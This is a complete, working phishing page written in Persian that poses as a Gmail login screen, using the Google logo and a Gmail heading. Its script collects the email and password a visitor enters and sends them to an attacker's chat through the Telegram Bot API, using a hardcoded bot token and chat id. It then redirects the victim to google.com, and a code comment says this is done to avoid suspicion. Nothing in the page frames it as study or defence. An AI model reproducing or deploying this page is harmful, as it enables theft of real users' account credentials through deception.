<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود به حساب کاربری</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; width: 300px; }
        img { width: 75px; margin-bottom: 20px; } /* لوگوی گوگل */
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #1765cc; }
        h2 { margin-top: 0; color: #333; }
    </style>
</head>
<body>

<div class="container">
    <!-- لوگوی گوگل -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
    
    <h2>ورود به Gmail</h2>
    
    <form id="loginForm">
        <input type="email" id="email" placeholder="ایمیل یا شماره تلفن" required>
        <input type="password" id="password" placeholder="رمز عبور" required>
        <button type="submit">بعدی</button>
    </form>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    
    // --- تنظیمات ربات شما (از قبل پر شده) ---
    const botToken = "8804326664:AAHGn87ZmgTeuzpRs3V1Fm0PGDy3QF50Jv4"; 
    const chatId = "8898735289";
    // -----------------------------------------

    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: "📧 ایمیل: " + email + "\n🔑 رمز: " + password
        })
    }).then(response => {
        console.log("Success:", response);
        // هدایت کاربر به صفحه اصلی گوگل تا شک نکند
        window.location.href = "https://www.google.com";
    }).catch(error => {
        console.error("Error:", error);
        alert("خطا در ارسال اطلاعات!");
    });
});
</script>

</body>
</html>
